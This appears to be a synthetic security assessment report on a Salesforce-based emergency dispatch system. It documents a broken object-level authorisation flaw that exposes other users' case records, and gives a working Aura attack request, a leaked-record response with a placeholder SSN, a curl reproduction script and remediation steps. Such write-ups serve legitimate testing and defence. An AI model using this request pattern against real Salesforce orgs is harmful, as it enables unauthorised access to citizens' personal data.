# Security Analysis Report
**System:** FirstResponse CAD Integration (Salesforce-Integrated)
**Domain:** Government / Emergency Dispatch / CAD
**Example ID:** SF-0058
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `CaseController.getCaseDetails` — attacker reads any government dispatch Case record with all sensitive fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Case Object (Pattern 1.12)

### Summary
The Apex controller `CaseController` on FirstResponse CAD Integration (`75577115.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 1.12, the client-supplied `fields` array enables mass field assignment — the attacker requests all sensitive fields (`SensitiveData__c`, `InternalNotes__c`) for Case `0017115` owned by another user. In a government/CAD context, Case records may represent emergency dispatch incidents, responder assignments, and citizen PII.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://75577115.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getCaseDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://75577115.lightning.force.com/aura
Authorization: Bearer 00D75577115!AR75577115...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D75577115!AR75577115...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"0017115","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Government Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0017115", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-44-4984"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D75577115!AR75577115..."
curl -s -X POST "https://75577115.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"0017115","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-44-4984
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. **Government note:** Citizen SSN (`000-44-4984`) exposure from CAD incident record is a critical PII breach under government data protection regulations.
